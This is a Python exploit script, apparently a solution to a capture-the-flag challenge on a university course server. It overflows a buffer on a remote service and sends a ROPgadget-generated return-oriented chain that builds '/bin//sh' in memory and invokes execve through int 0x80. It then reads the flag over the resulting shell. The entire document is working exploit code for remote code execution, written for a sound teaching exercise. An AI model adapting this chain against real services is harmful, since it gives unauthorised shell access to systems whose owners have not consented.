# execve generated by ROPgadget

from struct import pack
from pwn import remote

s = remote("cs412-ctf.epfl.ch", 10008)
# Padding goes here
p = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbaaaaaaaa'

p += pack('<I', 0x0807112b) # pop edx ; ret
p += pack('<I', 0x080f3060) # @ .data
p += pack('<I', 0x080bf386) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08056cc5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807112b) # pop edx ; ret
p += pack('<I', 0x080f3064) # @ .data + 4
p += pack('<I', 0x080bf386) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08056cc5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807112b) # pop edx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x08056280) # xor eax, eax ; ret
p += pack('<I', 0x08056cc5) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d9) # pop ebx ; ret
p += pack('<I', 0x080f3060) # @ .data
p += pack('<I', 0x08071152) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x080f3060) # padding without overwrite ebx
p += pack('<I', 0x0807112b) # pop edx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x08056280) # xor eax, eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x0807e5ba) # inc eax ; ret
p += pack('<I', 0x08049663) # int 0x80

s.sendline(p)
s.recvline()
s.recvline()
s.sendline("cat flag")

print(s.recvline(keepends=False).decode('latin-1'))
s.close()
